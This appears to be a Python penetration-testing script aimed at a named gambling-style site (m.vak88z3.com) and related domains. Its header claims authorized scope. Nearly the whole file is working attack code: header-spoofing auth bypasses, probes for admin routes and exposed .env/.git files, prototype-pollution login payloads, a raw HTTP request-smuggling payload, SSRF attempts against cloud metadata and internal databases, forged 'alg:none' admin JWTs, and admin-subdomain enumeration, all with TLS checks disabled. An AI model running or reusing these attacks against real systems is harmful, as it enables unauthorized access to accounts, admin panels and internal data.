#!/usr/bin/env python3
"""
vak88_probe.py — Full attack-surface probe for vak88z3.com / ztechdev stack
Scope: authorized — scope.json (WE88Z-VAK88-2026-09)
Rate: <=10 rps per ROE
"""
import json, time, sys, re, ssl, socket, os
import urllib.request, urllib.error, urllib.parse
from datetime import datetime, timezone
from pathlib import Path

TARGET   = os.environ.get("VAK88_HOST", "m.vak88z3.com")
BASE_URL = f"https://{TARGET}"
RATE     = 10
OUT      = f"vak88_probe_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

results = []
_last   = [0.0]

def req(method, url, headers=None, body=None, timeout=8):
    now = time.time()
    gap = 1.0 / RATE - (now - _last[0])
    if gap > 0: time.sleep(gap)
    _last[0] = time.time()
    hdrs = {"User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "application/json, text/html", **(headers or {})}
    data = body.encode() if isinstance(body, str) else body
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
            raw = resp.read(4096)
            return resp.status, dict(resp.headers), raw.decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read(2048)
        return e.code, dict(e.headers), raw.decode("utf-8", errors="replace")
    except Exception as ex:
        return 0, {}, str(ex)

def probe(label, method, url, headers=None, body=None, notes=""):
    status, hdrs, body_r = req(method, url, headers, body)
    snip = body_r[:300].replace("\n", " ")
    marker = "✓" if 200 <= status < 300 else ("⚠" if status in (301,302,307,308) else "✗")
    print(f"  {marker} [{status}] {label}")
    if notes:
        for sig, msg in notes.items():
            if status in sig or (isinstance(sig, range) and status in sig):
                print(f"      → {msg}")
    rec = {"label": label, "method": method, "url": url,
           "status": status, "headers": hdrs, "snippet": snip,
           "notes": notes, "ts": datetime.now(timezone.utc).isoformat()}
    results.append(rec)
    return status, hdrs, body_r

# ── 1. Header injection / auth bypass ────────────────────────────────────────
print(f"\n[1] Header injection & auth bypass — {TARGET}")

bypass_headers = [
    ("X-Forwarded-For: 127.0.0.1",          {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Real-IP: 127.0.0.1",                 {"X-Real-IP": "127.0.0.1"}),
    ("X-Original-URL: /admin",               {"X-Original-URL": "/admin"}),
    ("X-Rewrite-URL: /admin",                {"X-Rewrite-URL": "/admin"}),
    ("X-Forwarded-Host: localhost",           {"X-Forwarded-Host": "localhost"}),
    ("CF-Connecting-IP: 127.0.0.1",          {"CF-Connecting-IP": "127.0.0.1"}),
    ("True-Client-IP: 127.0.0.1",            {"True-Client-IP": "127.0.0.1"}),
    ("X-Custom-IP-Authorization: 127.0.0.1", {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("X-Forwarded-For: ::1",                  {"X-Forwarded-For": "::1"}),
]
for label, hdrs in bypass_headers:
    probe(label, "GET", f"{BASE_URL}/th/login", headers=hdrs,
          notes={(200,): "200 — header reflected or bypass possible",
                 (403,): "403 — header noted but blocked"})

# ── 2. Path traversal / hidden admin routes ───────────────────────────────────
print(f"\n[2] Hidden routes & admin endpoints")
paths = [
    "/admin", "/api/admin", "/api/v1/admin", "/dashboard",
    "/management", "/manager", "/backend", "/backoffice",
    "/api/health", "/api/status", "/api/version",
    "/api/users", "/api/config", "/api/settings",
    "/service/admin", "/service/config", "/service/users",
    "/.env", "/.git/config", "/server-status", "/phpinfo.php",
    "/api/deposit/list", "/api/withdraw/list", "/api/member/list",
]
for path in paths:
    probe(f"GET {path}", "GET", f"{BASE_URL}{path}",
          notes={(200,): "200 LIVE ★", (401,): "401 — auth required (exists!)",
                 (403,): "403 — forbidden (exists!)"})

# ── 3. Prototype pollution (Node.js) ─────────────────────────────────────────
print(f"\n[3] Prototype pollution — /service/authenticate")
auth_url = f"{BASE_URL}/service/authenticate"
pp_payloads = [
    ('{"__proto__":{"admin":true},"username":"0811111111","password":"1234"}',
     "proto.__admin"),
    ('{"constructor":{"prototype":{"admin":true}},"username":"0811111111","password":"1234"}',
     "constructor.prototype.admin"),
    ('{"username":"0811111111","password":"1234","__proto__":{"isAdmin":1}}',
     "proto.isAdmin"),
    ('{"username":"0811111111","password":"1234","role":"admin"}',
     "role=admin inject"),
    ('{"username":"admin","password":"admin","__proto__":{"authenticated":true}}',
     "proto.authenticated"),
]
for body, lbl in pp_payloads:
    probe(f"POST proto-pollution: {lbl}", "POST", auth_url,
          headers={"Content-Type": "application/json"}, body=body,
          notes={(200,): "200 ★ POSSIBLE AUTH BYPASS",
                 (400,): "400 — rejected (proto key filtered?)",
                 (500,): "500 — server error (proto merge crash)"})

# ── 4. HTTP Request Smuggling (ALB TE.CL) ────────────────────────────────────
print(f"\n[4] HTTP Request Smuggling probe (timing-based)")
# Send TE: chunked + Content-Length mismatch — if ALB and backend disagree,
# the "smuggled" prefix will be processed by the next request.
# Use urllib with raw socket for better control.
try:
    host = TARGET
    import threading

    def _raw_smuggle():
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(socket.create_connection((host, 443), timeout=5), server_hostname=host)
            # TE.CL smuggle attempt: chunked body with embedded extra request
            payload = (
                "POST /th/login HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "96\r\n"
                "GET /admin HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 10\r\n"
                "\r\n"
                "data=probe\r\n"
                "0\r\n"
                "\r\n"
            )
            s.sendall(payload.encode())
            time.sleep(1)
            resp = s.recv(4096).decode("utf-8", errors="replace")
            s.close()
            return resp[:500]
        except Exception as ex:
            return str(ex)

    t = threading.Thread(target=lambda: results.append({
        "label": "HTTP Smuggling TE.CL",
        "method": "RAW",
        "url": f"https://{host}/th/login",
        "status": 0,
        "snippet": _raw_smuggle(),
        "ts": datetime.now(timezone.utc).isoformat(),
    }))
    t.start(); t.join(timeout=10)
    last = results[-1]
    snip = last.get("snippet", "")
    marker = "⚠" if "HTTP" in snip else "✗"
    print(f"  {marker} [RAW] HTTP Smuggling TE.CL → {snip[:100]}")
except Exception as e:
    print(f"  ✗ [ERR] smuggling probe failed: {e}")

# ── 5. SSRF via URL params ────────────────────────────────────────────────────
print(f"\n[5] SSRF / open redirect probes")
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:6379/",      # Redis
    "http://127.0.0.1:27017/",     # MongoDB
    "http://0.0.0.0:9200/",        # Elasticsearch
]
for ssrf_url in ssrf_targets:
    enc = urllib.parse.quote(ssrf_url, safe="")
    for param in ["url", "redirect", "next", "return", "callback", "img", "src", "file", "path"]:
        u = f"{BASE_URL}/th/login?{param}={enc}"
        status, _, body_r = req("GET", u)
        if status == 200 and any(k in body_r for k in ["ami-id", "computeMetadata", "redis_version", "elastic"]):
            print(f"  ✓ SSRF HIT: {param}={ssrf_url} → {body_r[:100]}")
            results.append({"label": f"SSRF {param}={ssrf_url}", "status": status,
                             "snippet": body_r[:300], "ts": datetime.now(timezone.utc).isoformat()})
            break
print("  (no SSRF reflection found in login params — check API endpoints)")

# ── 6. JWT none-alg / manipulation ───────────────────────────────────────────
print(f"\n[6] JWT alg:none probe on authenticated endpoints")
import base64
def make_jwt(payload, alg="none"):
    h = base64.urlsafe_b64encode(json.dumps({"alg": alg, "typ": "JWT"}).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h}.{p}."

admin_jwt = make_jwt({"sub": "admin", "role": "admin", "admin": True,
                       "username": "0811111111", "iat": int(time.time())})
for ep in ["/api/admin", "/service/config", "/service/users", "/api/member/list"]:
    probe(f"JWT none-alg {ep}", "GET", f"{BASE_URL}{ep}",
          headers={"Authorization": f"Bearer {admin_jwt}"},
          notes={(200,): "200 ★★ JWT BYPASS", (401,): "401 — rejected", (403,): "403 — forbidden"})

# ── 7. ALB origin IP discovery ────────────────────────────────────────────────
print(f"\n[7] ALB origin discovery")
# Try common AWS ALB patterns and direct EC2 access
alb_bypass_headers = [
    {"Host": TARGET, "X-Forwarded-For": "127.0.0.1", "CF-Bypass": "1"},
    {"Host": "localhost"},
    {"Host": "127.0.0.1"},
]
for hdrs in alb_bypass_headers:
    probe(f"ALB bypass Host:{hdrs.get('Host')}", "GET", f"{BASE_URL}/",
          headers=hdrs)

# ── 8. manage.* / admin subdomain rewrite probes ─────────────────────────────
print(f"\n[8] manage.* / admin subdomain discovery")
# Extract base domain from TARGET
parts = TARGET.split(".")
base = ".".join(parts[-2:]) if len(parts) >= 2 else TARGET
admin_subs = [
    f"manage.{base}",
    f"admin.{base}",
    f"backoffice.{base}",
    f"bo.{base}",
    f"cms.{base}",
    f"api.{base}",
    f"panel.{base}",
    f"dashboard.{base}",
    f"agent.{base}",
    f"operator.{base}",
    f"staff.{base}",
    f"report.{base}",
    f"internal.{base}",
    f"manage.ztechdev.com",
    f"admin.ztechdev.com",
    f"bo.ztechdev.com",
    f"panel.ztechdev.com",
    f"cms.ztechdev.com",
    f"manage.luxino.com",
    f"admin.luxino.com",
    f"bo.luxino.com",
]

for sub in admin_subs:
    try:
        ip = socket.gethostbyname(sub)
    except Exception:
        ip = None
    if not ip:
        print(f"  ✗ [DNS]  {sub}")
        continue
    url = f"https://{sub}/"
    status, hdrs, body_r = req("GET", url)
    srv = hdrs.get("server", hdrs.get("Server", ""))
    powered = hdrs.get("x-powered-by", hdrs.get("X-Powered-By", ""))
    marker = "✓" if 200 <= status < 300 else ("⚠" if status in (301,302,307,308,401,403) else "✗")
    print(f"  {marker} [{status}] {sub} ({ip}) srv={srv} {powered}")
    results.append({
        "label":   f"admin-sub {sub}",
        "status":  status,
        "url":     url,
        "ip":      ip,
        "snippet": body_r[:200],
        "ts":      datetime.now(timezone.utc).isoformat(),
    })
    # If found, probe standard admin paths
    if status in (200, 401, 403, 302):
        for admin_path in ["/", "/login", "/dashboard", "/api", "/api/v1", "/admin"]:
            ps, _, pb = req("GET", f"https://{sub}{admin_path}")
            if ps != status or admin_path != "/":
                print(f"       [{ps}] {admin_path} → {pb[:80].strip()}")

# ── Save ──────────────────────────────────────────────────────────────────────
Path(OUT).write_text(json.dumps({
    "ts":      datetime.now(timezone.utc).isoformat(),
    "target":  BASE_URL,
    "probes":  len(results),
    "hits":    [r for r in results if r.get("status") and 200 <= r["status"] < 300],
    "results": results,
}, indent=2, ensure_ascii=False))

confirmed = [r for r in results if r.get("status") and 200 <= r["status"] < 300]
print(f"\n{'─'*60}")
print(f"Done — {len(results)} probes, {len(confirmed)} got 2xx")
print(f"Saved: {OUT}")
